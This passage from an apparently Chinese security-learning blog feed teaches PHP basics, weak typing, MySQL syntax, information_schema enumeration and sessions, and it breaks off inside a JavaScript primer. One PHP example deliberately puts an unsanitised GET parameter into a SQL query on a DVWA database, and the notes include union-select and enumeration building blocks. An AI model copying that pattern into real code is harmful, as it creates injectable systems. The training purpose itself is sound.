$GLOBALS</code></pre><p>（3）$_GET &amp; $_POST：获取GET或POST请求参数的值</p><ul><li>get.php</li></ul><pre><code class="php">&lt;?php    echo &quot;Hello,your name is &quot;.$_GET[&#39;user&#39;];?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/17/LXybUOQsDMm3jRd.png" alt="image-20210317185828678"></p><ul><li>post.php</li></ul><pre><code class="php">&lt;?php    echo &quot;Hello,your name is &quot;.$_POST[&#39;user&#39;];?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/17/HN6eUCJisLYTmar.png" alt="image-20210317185705591"></p><p>（4）$_SERVER：保存关于报头、路径和脚本位置的信息。</p><pre><code class="php">&lt;?php    echo $_SERVER[&#39;PHP_SELF&#39;].&quot;&lt;br/&gt;&quot;;      //输出当前PHP文件名    echo $_SERVER[&#39;SERVER_NAME&#39;].&quot;&lt;br/&gt;&quot;;   //输出当前运行脚本所在的服务器的主机名    echo $_SERVER[&#39;HTTP_HOST&#39;].&quot;&lt;br/&gt;&quot;;     //输出当前服务器的主机名    echo $_SERVER[&#39;HTTP_REFERER&#39;].&quot;&lt;br/&gt;&quot;;  //返回来自当前请求的host头    echo $_SERVER[&#39;HTTP_USER_AGENT&#39;].&quot;&lt;br/&gt;&quot;;//返回当前请求页面的上一个页面URL    echo $_SERVER[&#39;HTTP_NAME&#39;].&quot;&lt;br/&gt;&quot;;      //返回当前请求客户端的User-Agent    echo $_SERVER[&#39;HTTP_STRING&#39;].&quot;&lt;br/&gt;&quot;;    //返回获取查询语句，一般是问号后面的字符串?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/17/SWNFo5Pe9uKhxtX.png" alt="image-20210317192027470"></p><p><img src="https://i.loli.net/2021/03/17/NCdmWJTq4w8f6V5.png" alt="image-20210317192044223"></p><p>（5）$GLOBALS</p><ul><li>应用全局作用域中可用的全部变量</li><li>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</li></ul><pre><code class="php">&lt;?php    $_ =&quot;123456&quot;;    $a =&quot;&lt;br&gt;hello&quot;;    $b =&quot;&lt;br&gt;world&quot;;    echo $GLOBALS[&#39;_&#39;];    echo $GLOBALS[&#39;a&#39;];    echo $GLOBALS[&#39;b&#39;];?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/17/J2txUnQHCuf36j7.png" alt="image-20210317192914226"></p><h3 id="PHP表单处理"><a href="#PHP表单处理" class="headerlink" title="PHP表单处理"></a>PHP表单处理</h3><p>PHP超全局变量$_GET和$_POST用于收集表单数据（form-data）</p><ul><li>form.html</li></ul><pre><code class="html">&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;/&gt;        &lt;title&gt;goktech&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;    &lt;form action=&quot;form.php&quot; method=&quot;POST&quot;&gt;        姓名：&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;&lt;br/&gt;        电邮：&lt;input type=&quot;text&quot; name=&quot;email&quot;&gt;&lt;br/&gt;        &lt;input type=&quot;submit&quot;&gt;    &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><ul><li>form.php</li></ul><pre><code class="php">&lt;?php    $name=$_POST[&#39;name&#39;];    $email=$_POST[&#39;email&#39;];    echo &quot;Welcome &quot;,$name;    echo &quot;&lt;br&gt;&quot;;    echo &quot;Your email is &quot;,$email;    header(&quot;Content-Type:text/html;charset=UTF-8&quot;);     //解决中文乱码?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/18/4IPyNqHUoCFzpEK.png" alt="image-20210318095619457"></p><p><img src="https://i.loli.net/2021/03/18/jYD3WQx45qdVewb.png" alt="image-20210318095636257"></p><h3 id="PHP数据类型"><a href="#PHP数据类型" class="headerlink" title="PHP数据类型"></a>PHP数据类型</h3><p>（1）PHP数据类型分为：字符串、整数、浮点数、逻辑、数组、对象、NULL。</p><p>（2）PHP字符串：</p><ul><li>字符串是字符序列，比如“Hello world!”。</li><li>字符串可以是引号内的任何文本。可以使用单引号或双引号</li></ul><p>（3）PHP整数；可以用三种格式规定整数：十进制、十六进制(前缀是0x)或八进制(前缀是0)</p><p>（4）var_dump()会返回变量的数据类型和值</p><pre><code class="php">&lt;?php$x=666;$y=0x8c;   //十六进制数$z=047;    //八进制数var_dump($x);var_dump($y);var_dump($z);?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/18/KeEHsqhbv43xl6y.png" alt="image-20210318100414764"></p><p>（5）PHP浮点数：浮点数是有小数点或指数形式的数字。float类型数据强制转换为int类型数据时会造成溢出。</p><pre><code class="php">&lt;?php$x=11.123;$y=2.4e3;$z=8e-5;var_dump($x);var_dump($y);var_dump($z);?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/18/1QAOSYM6mHVgoUC.png" alt="image-20210318103306580"></p><p>（6）PHP数组：</p><ul><li>数组能够在单独的变量名中存储一个或多个值。</li><li>在PHP中，array()函数用于创建数组</li><li>在PHP中，有三种数组类型：</li></ul><pre><code>索引数组-带有数字索引的数组关联数组-带有指定键的数组多维数组-包含一个或多个数组的数组</code></pre><ul><li>获得数组的长度-count()函数：用于返回数组的长度（元素数）</li></ul><p>（7）PHP索引数组：带有数字索引的数组</p><pre><code class="php">&lt;?php$shuiguo=array(&quot;苹果&quot;,&quot;香蕉&quot;,&quot;西瓜&quot;);echo $shuiguo[0],$shuiguo[1],$shuiguo[2];$len=count($shuiguo);echo &quot;&lt;br/&gt;&quot;;echo $len.&quot;&lt;br/&gt;&quot;;for ($i=0;$i&lt;$len;$i++)&#123;     //遍历索引数组    echo $shuiguo[$i];&#125;header(&quot;Content-Type:text/html;charset=utf-8&quot;);?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/18/CuixX4ZEo5sMD9B.png" alt="image-20210318132313725"></p><p>（8）PHP关联数组：带有指定键的数组</p><pre><code class="php">&lt;?php$shuiguo=array(&quot;苹果&quot;=&gt;&quot;3&quot;,&quot;香蕉&quot;=&gt;&quot;5&quot;,&quot;西瓜&quot;=&gt;&quot;9&quot;);foreach($shuiguo as $x=&gt;$y)&#123;     //用foreach遍历关联数组    echo $x.&quot;--&gt;&quot;.$y;    echo &quot;&lt;br/&gt;&quot;;&#125;header(&quot;Content-Type:text/html;charset=utf-8&quot;);?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/18/6Fz2cg7T3HkYZX5.png" alt="image-20210318132830706"></p><h3 id="PHP函数"><a href="#PHP函数" class="headerlink" title="PHP函数"></a>PHP函数</h3><p>（1）PHP拥有超过1000个内建函数</p><p>（2）PHP默认参数值。以下例子展示了如何使用默认参数。若调用自定义的没有参数的setHeight()函数，它的参数会取默认值50。</p><pre><code class="php">&lt;?phpfunction setHeight($minheight=50)&#123;    echo &quot;高度是：$minheight &lt;br/&gt;&quot;;&#125;setHeight(350);setHeight();setHeight(135);header(&quot;Content-Type:text/html;charset=utf-8&quot;);?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/18/isdQgbrCOHAp2lL.png" alt="image-20210318133544243"></p><pre><code class="php">&lt;?phpfunction sum($x,$y)&#123;    $z=$x+$y;    return $z;      //return定义函数返回值&#125;echo &quot;5 + 7 =&quot;.sum(5,7).&quot;&lt;br/&gt;&quot;;echo &quot;6 + 6 =&quot;.sum(6,6).&quot;&lt;br/&gt;&quot;;header(&quot;Content-Type:text/html;charset=utf-8&quot;);?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/18/ihD1SGJaCnFcV5e.png" alt="image-20210318134041089"></p><h3 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h3><p>（1）PHP是一门类型松散的语言——弱类型</p><ul><li>在定义PHP变量时不必告知变量的数据类型</li><li>不同数据类型在比较时会发生强制类型转换，PHP根据它的值，自动把变量转换为正确的数据类型。</li></ul><p>（2）PHP的两种比较运算符”==”和”===”</p><ul><li>==等于符号，比较时，会先转换成相同的数据类型，然后比较值。</li><li>===全等于符号，比较时，先比较数据类型是否相同，然后比较值</li></ul><pre><code class="php">&lt;?php$x=NULL;$y=0;$z=&quot;abc&quot;;var_dump($x == $y);   //NULL和整数0，trueecho &quot;&lt;br/&gt;&quot;;         var_dump($x == $z);   //NULL和字符串，falseecho &quot;&lt;br/&gt;&quot;;var_dump($y == $z);   //整数0和字符串，trueecho &quot;&lt;br/&gt;&quot;;echo &quot;&lt;br/&gt;&quot;;var_dump($x === $y);  //NULL和整数0，falseecho &quot;&lt;br/&gt;&quot;;var_dump($x === $z);  //NULL和字符串，falseecho &quot;&lt;br/&gt;&quot;;var_dump($y === $z);  //整数0和字符串，falseecho &quot;&lt;br/&gt;&quot;;header(&quot;Content-Type:text/html;charset=utf-8&quot;);?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/18/yGCsctegp4BKAj7.png" alt="image-20210318135601549"></p><p>（3）0e字符串和0x字符串比较时：</p><ul><li>若字符串是0e类型，PHP会将其解析为科学计数法</li><li>若字符串是0x类型，PHP会将其解析为十六进制</li></ul><pre><code class="php">&lt;?php$a=1.23e+3;$b=&quot;1.23e+3&quot;;$c=0x4c;$d=&quot;0x4c&quot;;echo $a.&quot;&lt;br/&gt;&quot;;echo $b.&quot;&lt;br/&gt;&quot;;echo $c.&quot;&lt;br/&gt;&quot;;echo $d.&quot;&lt;br/&gt;&quot;;echo &quot;&lt;br/&gt;&quot;;var_dump($a == $b);echo &quot;&lt;br/&gt;&quot;;var_dump($c == $d);header(&quot;Content-Type:text/html;charset=utf-8&quot;);?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/18/sTgKS3Rov7jENAz.png" alt="image-20210318141329399"></p><h2 id="SQL的进阶语法"><a href="#SQL的进阶语法" class="headerlink" title="SQL的进阶语法"></a>SQL的进阶语法</h2><h3 id="数据库系统"><a href="#数据库系统" class="headerlink" title="数据库系统"></a>数据库系统</h3><p>（1）数据库：长期存储在计算机内的、有组织的、可共享的数据集合。</p><p>（2）DBMS(DataBase Management System)</p><ul><li>一种操纵和管理数据库的大型软件，用于建立、使用和维护数据库</li><li>它对数据库进行统一的管理和控制，以保证数据库的安全性和完整性</li><li>常见的DBMS包括access、SQLserver、mysql、oracle、DB2等</li></ul><p><img src="https://i.loli.net/2021/03/18/fv8WpUEh1g2FZje.png" alt="image-20210318142031864"></p><h3 id="基础查询语句"><a href="#基础查询语句" class="headerlink" title="基础查询语句"></a>基础查询语句</h3><p>（1）select * from admin;</p><ul><li>select语句用于从表中选取数据，结果被存储在一个结果表中(称结果集)。以下例子说明admin表中有id，role，username，password，city，age这6列，共5行。</li></ul><p><img src="https://i.loli.net/2021/03/18/XKT8ZW5nowuz2Cp.png" alt="image-20210318150151954"></p><ul><li>如需有条件地从表中选取数据，可将where子句添加到select语句中。</li></ul><p><img src="https://i.loli.net/2021/03/18/VLYn6PwCyrMcDuh.png" alt="image-20210318150401661"></p><p>（2）AND &amp; OR运算符</p><ul><li>AND和OR运算符用于根据多个条件筛选记录。AND优先级高于OR。</li><li>若AND分隔的所有条件为true，则AND运算符显示记录</li></ul><p><img src="https://i.loli.net/2021/03/18/nDVuwvXOTZriCsQ.png" alt="image-20210318151451097"></p><ul><li>若有OR分隔的任何条件为真，则OR运算符显示记录</li></ul><p><img src="https://i.loli.net/2021/03/18/sTIqZpc6YixnH81.png" alt="image-20210318151556785"></p><p>（3）order by排序：默认情况下按升序排序记录</p><p><img src="https://i.loli.net/2021/03/18/kYPTKGzq6fjFAXm.png" alt="image-20210318152040641"></p><ul><li>执行select * from admin order by 6;（按照第6列进行排序，效果同上）</li><li>若列数超出则会报错</li></ul><p><img src="https://i.loli.net/2021/03/18/tg4IJm9X1CvwRT8.png" alt="image-20210318152204167"></p><p>（4）MySQL支持limit子句，用以取回有限数量的记录。</p><p>（5）从第n行开始，显示后面m行：limit n,m （或者limit m offset n）。</p><ul><li>从第0行开始，显示后面1行</li></ul><p><img src="https://i.loli.net/2021/03/18/ZOFJn6rRpVqc2md.png" alt="image-20210318152654793"></p><ul><li>从第2行开始，显示后面3行</li></ul><p><img src="https://i.loli.net/2021/03/18/tQ9UWLkdE3FzsmI.png" alt="image-20210318152726593"></p><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>UNION运算符用于组合两个或更多select语句的结果集。</p><ul><li>这些列必须具有相似的数据类型</li><li>每个select语句中的列也必须以相同的顺序排列</li></ul><p><img src="https://i.loli.net/2021/03/18/52lJFVIcEN6La9y.png" alt="image-20210318153258170"></p><ul><li>union查询会按照select的顺序显示结果集</li><li>当不知道另一张表aadmin时，可借助mysql的弱类型达到构造union语句。</li></ul><pre><code class="sql">select * from admin union select 1,2,3,4,5,6;</code></pre><h3 id="SELECT子句"><a href="#SELECT子句" class="headerlink" title="SELECT子句"></a>SELECT子句</h3><p>（1）select查询的结果可作为另一个select查询的列的结果。</p><p>（2）这种查询方式属于SQL子查询的一种。</p><p><img src="https://i.loli.net/2021/03/18/7bKJSaygOLYXlIm.png" alt="image-20210318154404839"></p><h3 id="基本建表和增删改语句"><a href="#基本建表和增删改语句" class="headerlink" title="基本建表和增删改语句"></a>基本建表和增删改语句</h3><p>（1)CREATE 用来建表，格式如下</p><pre><code class="sql">creat table 表名称 (列名称1 数据类型,列名称2 数据类型,列名称3 数据类型,...);</code></pre><p>例如新建一张表test，插入3个列分别为id，username，password</p><pre><code class="sql">creat table test (id int,username varchar(255),password varchar(255));</code></pre><p>（2）INSERT用来增加一条记录</p><pre><code class="sql">insert into test (id,username,password) values(1,&#39;admin&#39;,&#39;admin123&#39;);</code></pre><p>（3）UPDATE用来修改一条记录</p><pre><code class="sql">update test set username=&#39;admin_A&#39;,password=&#39;admin321&#39; where username=&#39;admin&#39;;</code></pre><p>（4）DELETE用来删除一条记录</p><pre><code class="sql">delete from test where username=&#39;admin_A&#39;;</code></pre><h3 id="数据库管理系统的内置数据库"><a href="#数据库管理系统的内置数据库" class="headerlink" title="数据库管理系统的内置数据库"></a>数据库管理系统的内置数据库</h3><p>（1）MySQL有一个默认的内置数据库，信息数据库information_schema</p><p>（2）information_schema有三张关键的表：schemata、tables、columns</p><p>（3）schemata表的schema_name列存放的是所有的数据库名</p><pre><code class="sql">select schema_name from information_schema.schemata;或者使用show databases;</code></pre><p><img src="https://i.loli.net/2021/03/18/F1XeAcMPWNJpgiv.png" alt="image-20210318160004813"></p><p><img src="https://i.loli.net/2021/03/18/dQupgmRqYFH1jVK.png" alt="image-20210318160139745"></p><p>（4）MySQL有一个默认的内置数据库，信息数据库information_schema。</p><p>（5）information_schema有三张关键的表：schemata、tables、columns。</p><p>（6）tables表的table_schema列存放的是所有的数据库名，table_name列存放的是数据库对应的所有表名。</p><ul><li>如要查询数据库mysql的所有表名。</li></ul><pre><code class="sql">select table_name from information_schema.tables where table_schema=&#39;mysql&#39;;或者也可以use mysql;   //进入或使用mysql数据库show tables; //查询数据库mysql的所有表名</code></pre><p><img src="https://i.loli.net/2021/03/18/1682TjYsrg4ZwLz.png" alt="image-20210318160929363"></p><p>（7）columns表的column_name列存放的是所有的列名，table_schema列存放的是数据库对应的所有数据库名，table_name列存放的是数据库对应的所有数据库表名。</p><ul><li>如要查询数据库mysql的user表的所有列</li></ul><pre><code class="sql">select column_name from information_schema.columns where table_schema=&#39;mysql&#39; and table_name=&#39;user&#39;;</code></pre><p><img src="https://i.loli.net/2021/03/18/TWgM79RIdoE8HQG.png" alt="image-20210318162436206"></p><h3 id="数据库管理系统的内置函数"><a href="#数据库管理系统的内置函数" class="headerlink" title="数据库管理系统的内置函数"></a>数据库管理系统的内置函数</h3><p>（1）不同的DBMS有各自专属的内置函数，以下是mysql常见的一些内置函数：</p><ul><li>user()查看当前数据库账号的用户名。</li></ul><pre><code class="sql">select user();</code></pre><p><img src="https://i.loli.net/2021/03/18/URcaVqTSufPL3MB.png" alt="image-20210318162714816"></p><ul><li>version()查看当前数据库的版本。</li></ul><pre><code class="sql">select version();</code></pre><p><img src="https://i.loli.net/2021/03/18/KPrsadqNOCEYGvm.png" alt="image-20210318162832065"></p><ul><li>database()查看当前所在查询的数据库名。</li></ul><pre><code class="sql">use dvwa;        //进入数据库dvwaselect database();</code></pre><p><img src="https://i.loli.net/2021/03/18/8neVsDGyQMBiCbo.png" alt="image-20210318163032842"></p><ul><li>@@datadir查看当前数据库所在物理路径</li></ul><pre><code class="sql">select @@datadir;</code></pre><p><img src="https://i.loli.net/2021/03/18/dWr5xZLaBMt3gve.png" alt="image-20210318163155843"></p><ul><li>sleep(n)睡眠函数，运行n秒后返回结果。</li></ul><pre><code class="sql">select sleep(5);</code></pre><p><img src="https://i.loli.net/2021/03/18/12GpoYXVtqlrhkU.png" alt="image-20210318163426515"></p><ul><li>length()返回结果长度。</li></ul><pre><code class="sql">select length(&quot;admin&quot;);</code></pre><p><img src="https://i.loli.net/2021/03/18/pt8kxOaDSic4neG.png" alt="image-20210318163540873"></p><ul><li>substr(str,n,m)截取函数，从第n位开始截取m。</li></ul><pre><code class="sql">select substr(&quot;admin&quot;,2,3);</code></pre><p><img src="https://i.loli.net/2021/03/18/azWsL38ognlNjA1.png" alt="image-20210318163706953"></p><ul><li>if(expr,r1,r2)判断函数，expr条件为真返回r1，为假返回r2。</li></ul><pre><code class="sql">select if((1&gt;2),111,222);</code></pre><p><img src="https://i.loli.net/2021/03/18/KEAGFgyRhPWUjeZ.png" alt="image-20210318163855411"></p><ul><li>ord()返回一个字符的ASCII码</li></ul><pre><code class="sql">select ord(&#39;a&#39;);</code></pre><p><img src="https://i.loli.net/2021/03/18/f9XRdjrSKckml8Z.png" alt="image-20210318180058349"></p><ul><li>hex()返回一个字符的16进制，相反是unhex()。</li></ul><pre><code class="sql">select hex(&#39;a&#39;);</code></pre><p><img src="https://i.loli.net/2021/03/18/dXyhmpuAeQwUPcn.png" alt="image-20210318180229154"></p><ul><li>char()根据ASCII返回对应的字符</li></ul><pre><code class="sql">select char(97);</code></pre><p><img src="https://i.loli.net/2021/03/18/hPxKMdlTXVtbIic.png" alt="image-20210318180334990"></p><ul><li>bin()返回一个数的2进制</li></ul><pre><code class="sql">select bin(7);</code></pre><p><img src="https://i.loli.net/2021/03/18/HFRDXcQs4Gnygkt.png" alt="image-20210318180438798"></p><p>（2）concat()用于将多个字符串连接成一个字符串，多列成1列</p><pre><code class="sql">select user_id,&#39;---&#39;,user from users limit 0,1;</code></pre><p><img src="https://i.loli.net/2021/03/18/cTN87vnRX9W36Y5.png" alt="image-20210318181041151"></p><pre><code class="sql">select concat(user_id,&#39;---&#39;,user) from users limit 0,1;</code></pre><p><img src="https://i.loli.net/2021/03/18/uX68S9IN7AOx5ik.png" alt="image-20210318181128328"></p><p>（3）group_concat()用于返回字符串的所有结果，该结果由分组的值连接而成。</p><pre><code class="sql">select user_id,&#39;---&#39;,user from users limit 0,1;</code></pre><p><img src="https://i.loli.net/2021/03/18/cTN87vnRX9W36Y5.png" alt="image-20210318181041151"></p><pre><code class="sql">select group_concat(user_id,&#39;---&#39;,user)from users limit 0,1;</code></pre><p><img src="https://i.loli.net/2021/03/18/FJlRm1ha4uKiNCv.png" alt="image-20210318181515127"></p><h2 id="使用PHP管理SQL"><a href="#使用PHP管理SQL" class="headerlink" title="使用PHP管理SQL"></a>使用PHP管理SQL</h2><h3 id="PHP管理数据库"><a href="#PHP管理数据库" class="headerlink" title="PHP管理数据库"></a>PHP管理数据库</h3><p>（1）在不使用PHP的情况下，管理数据库的基本步骤：连接数据库-&gt;选择数据库-&gt;选择表-&gt;查询SQL语句</p><p><img src="https://i.loli.net/2021/03/18/NrBHuAIcLE8hapj.png" alt="image-20210318184524764"></p><p>（2）PHP连接数据库函数——mysqli_connect(servername,user,pass,database)</p><ul><li>servername：数据库地址</li><li>user：数据库用户名</li><li>pass：数据库密码</li><li>database：数据库名</li></ul><pre><code class="php">&lt;?php$con =mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;dvwa&quot;);if(!$con)&#123;    die(&#39;连接失败：&#39;.mysqli_connect_error());&#125;else&#123;    echo &quot;连接成功&quot;;&#125;mysqli_close($con);header(&quot;Content-Type:text/html;charset=utf-8&quot;);?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/18/Kikf8S9ap1l5Jbu.png" alt="image-20210318185742335"></p><p>（3）PHP执行SQL语句函数——mysqli_query(conn,sql)</p><ul><li>conn：数据库连接函数的结果</li><li>sql：SQL语句</li></ul><pre><code class="php">&lt;?php$con =mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;dvwa&quot;);if(!$con)&#123;    die(&#39;连接失败：&#39;.mysqli_connect_error());&#125;else&#123;    echo &quot;连接成功&lt;hr&gt;&quot;;&#125;$sql=&quot;select * from users limit 0,1&quot;;$result=mysqli_query($con,$sql);var_dump($result);mysqli_close($con);header(&quot;Content-Type:text/html;charset=utf-8&quot;);?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/18/tJcBy8beNTHK3qw.png" alt="image-20210318190457387"></p><p>（4）PHP获取执行结果函数——mysqli_fetch_array(query)</p><ul><li>query：执行SQL语句函数的结果</li><li>mysqli_num_rows(query)：获取结果数组长度</li></ul><pre><code class="php">&lt;?php$con =mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;dvwa&quot;);$sql=&quot;select * from users limit 0,1&quot;;$result=mysqli_query($con,$sql);if(mysqli_num_rows($result)&gt;0)&#123;    $row=mysqli_fetch_array($result);    echo $row[&#39;user_id&#39;].&quot;&lt;br/&gt;&quot;;    echo $row[&#39;first_name&#39;].&quot;&lt;br/&gt;&quot;;    echo $row[&#39;last_name&#39;].&quot;&lt;br/&gt;&quot;;    echo $row[&#39;user&#39;].&quot;&lt;br/&gt;&quot;;    echo $row[&#39;password&#39;].&quot;&lt;br/&gt;&quot;;&#125;mysqli_close($con);header(&quot;Content-Type:text/html;charset=utf-8&quot;);?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/18/Ft8EG4y12QASzfR.png" alt="image-20210318192511897"></p><h3 id="根据用户查询返回结果展示"><a href="#根据用户查询返回结果展示" class="headerlink" title="根据用户查询返回结果展示"></a>根据用户查询返回结果展示</h3><pre><code class="php">&lt;?php$con =mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;dvwa&quot;);if(!$con)&#123;    die(&#39;连接失败：&#39;.mysqli_connect_error());&#125;$id=$_GET[&#39;user_id&#39;];$sql =&quot;select * from `users` where user_id=$id&quot;;    //其中users不是用单引号括住，而是用` `$result=mysqli_query($con,$sql);if(mysqli_num_rows($result)&gt;0)&#123;    $row=mysqli_fetch_array($result);    echo &quot;您查询的用户名是： &quot;.$row[&#39;user&#39;].&quot;&lt;br/&gt;&quot;;    echo &quot;您查询的用户名密码是： &quot;.$row[&#39;password&#39;];&#125;mysqli_close($con);header(&quot;Content-Type:text/html;charset=utf-8&quot;);?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/18/GEd5cH3gzv9h2Ne.png" alt="image-20210318195520342"></p><h2 id="PHP的会话与权限管理"><a href="#PHP的会话与权限管理" class="headerlink" title="PHP的会话与权限管理"></a>PHP的会话与权限管理</h2><h3 id="Cookie和会话Session"><a href="#Cookie和会话Session" class="headerlink" title="Cookie和会话Session"></a>Cookie和会话Session</h3><p>（1）cookie用来管理服务器和客户之间的状态</p><ul><li>cookie的工作机制是<strong>用户识别及状态管理</strong></li><li>web网站为了管理用户的状态，会通过web浏览器，把一些数据临时写入用户的计算机内。当用户访问该web网站时，可通过通信方式取回之前发放的cookie。</li></ul><p>（2）session会在cookie中出现和传输，属于cookie的一部分</p><ul><li>当web服务器开启会话机制时，用户登录成功后，会将<strong>会话保存在服务器中</strong></li></ul><h3 id="PHP-Cookie"><a href="#PHP-Cookie" class="headerlink" title="PHP Cookie"></a>PHP Cookie</h3><p>（1）下发cookie函数：Setcookie()</p><ul><li>服务端会通过http响应包的set-cookie为浏览器分配cookie字段。</li></ul><pre><code class="php">&lt;?phpsetcookie(&quot;user&quot;,&quot;reborn&quot;,time()+3600);header(&quot;Content-Type:text/html;charset=utf-8&quot;);//创建名为“user”的cookie，并为它赋值“reborn”//规定此cookie在一小时后过期?&gt;</code></pre><p>（2）取回cookie的值</p><ul><li>PHP的$_COOKIE变量用于取回cookie的值</li></ul><pre><code class="php">&lt;?php    echo $_COOKIE[&quot;user&quot;];    //取回cookie的值    print_r($_COOKIE);        //查看所有cookie的方法?&gt;</code></pre><p>（3）删除cookie</p><ul><li>删除cookie时，应当使过期日期变更为过去的时间点</li></ul><pre><code class="php">&lt;?php    setcookie(&quot;user&quot;,&quot;&quot;,time()-3600);    //将过期数据设置为一小时前?&gt;</code></pre><h3 id="PHP-Sessions"><a href="#PHP-Sessions" class="headerlink" title="PHP Sessions"></a>PHP Sessions</h3><p>PHP开启会话函数：session_start()</p><ul><li>session_start()函数必须位于&lt;html&gt;标签之前</li></ul><pre><code class="html">&lt;?php session_start(); ?&gt;&lt;html&gt;    &lt;body&gt;        ......    &lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="存储PHP-Session"><a href="#存储PHP-Session" class="headerlink" title="存储PHP Session"></a>存储PHP Session</h3><p>存储记录Session：$_SESSION</p><pre><code class="php">&lt;?php    session_start();    $_SESSION[&#39;login_id&#39;]=1003;    $_SESSION[&#39;role&#39;]=&quot;student&quot;;?&gt;</code></pre><h3 id="终结PHP-Session"><a href="#终结PHP-Session" class="headerlink" title="终结PHP Session"></a>终结PHP Session</h3><p>（1）若需要删除某些session数据，可以使用unset()或session_destroy()函数</p><ul><li>unset()函数用于释放指定的session变量</li></ul><pre><code class="php">&lt;?php    unset($_SESSION[&#39;views&#39;])；?&gt;</code></pre><p>（2）可以通过session_destroy()函数彻底终结session</p><ul><li>session_destroy()将重置session，将失去所有已存储的session数据</li></ul><pre><code class="php">&lt;?php    session_destroy();?&gt;</code></pre><h3 id="利用session进行权限管理"><a href="#利用session进行权限管理" class="headerlink" title="利用session进行权限管理"></a>利用session进行权限管理</h3><p>当用户需要访问登录后的页面或特定身份才能访问的页面或数据，则通过session变量来校验用户身份权限和状态，根据校验结果决定是否允许用户进行相关操作。</p><ul><li>用户登录成功时为用户分配session变量</li><li>记录用户的登录状态和身份</li></ul><p><img src="https://i.loli.net/2021/03/18/8khDnLWJTZ5cmC7.png" alt="image-20210318203458759"></p><h3 id="header-函数"><a href="#header-函数" class="headerlink" title="header()函数"></a>header()函数</h3><p>header()函数是PHP中进行页面跳转的一种方法。</p><ul><li>header()函数的主要功能是将HTTP协议标头(header)输出到浏览器。</li></ul><pre><code class="php">&lt;?php    header(&quot;Location:http://www.qq.com&quot;);   //重定向浏览器    exit();   //确保重定向后，后续代码不会被执行?&gt;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 安全进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript代码进阶</title>
      <link href="2021/03/16/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/JavaScript%E4%BB%A3%E7%A0%81%E8%BF%9B%E9%98%B6/"/>
      <url>2021/03/16/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/JavaScript%E4%BB%A3%E7%A0%81%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="JavaScript简介"><a href="#JavaScript简介" class="headerlink" title="JavaScript简介"></a>JavaScript简介</h2><p>（1）JavaScript是web浏览器的语言，一种直译式脚本语言，是一种动态类型、弱类型、基于原型的语言，内置支持类型。</p><p>（2）它的解释器被称为JavaScript引擎，为浏览器的一部分，广泛用于客户端的脚本语言。最早是在HTML网页上使用，用来给HTML网页增加动态功能。</p><p>（3）JavaScript基本特点：</p><ul><li>脚本编写语言</li><li>基于对象的语言</li><li>简单性</li><li>安全性</li><li>动态性</li><li>跨平台性</li></ul><h2 id="JavaScript的基本语法"><a href="#JavaScript的基本语法" class="headerlink" title="JavaScript的基本语法"></a>JavaScript的基本语法</h2><p>（1）JavaScript中的脚本必须位于&lt;script&gt;与&lt;/script&gt;标签之间。浏览器的控制台可以执行js代码。</p><pre><code class="javascript">&lt;script type=&quot;text/javascript&quot; src=&quot;&quot;&gt;&lt;/script&gt;//外部引入js代码，src为资源路径</code></pre><p>（2）脚本可被放置在HTML页面的&lt;body&gt;和&lt;head&gt;部分中。</p><pre><code class="html">&lt;!doctype html&gt;&lt;html&gt;    &lt;body&gt;        &lt;script&gt;            document.write(&quot;&lt;h1&gt;this is a heading&lt;/h1&gt;&quot;);            document.write(&quot;&lt;p&gt;this is a paragraph&lt;/p&gt;&quot;);        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>（3）JavaScript的注释：</p><ul><li>单行注释：//</li></ul><pre><code class="javascript">&lt;script&gt;    //这表示单行注释，不会在页面中被显示    alert(&quot;my first javascript&quot;);&lt;/script&gt;</code></pre><ul><li>多行注释：/*在此写注释 */</li></ul><pre><code class="javascript">&lt;script&gt;    /*这表示多行注释，    不会在页面中被显示*/    alert(&quot;my first javascript&quot;);&lt;/script&gt;</code></pre><h3 id="JavaScript变量"><a href="#JavaScript变量" class="headerlink" title="JavaScript变量"></a>JavaScript变量</h3><p>（1）变量是存储信息的容器；typeof(a)，打印a的类型</p><pre><code class="javascript">var x=2;var y=3;var z=x+y;</code></pre><p>（2）声明（创建）JavaScript变量</p><ul><li>方法一：创建变量，为变量赋值；</li></ul><pre><code class="javascript">var carname;carname=&quot;Volvo&quot;;</code></pre><ul><li>方法二：创建变量的同时并为变量赋值；</li></ul><pre><code class="javascript">var 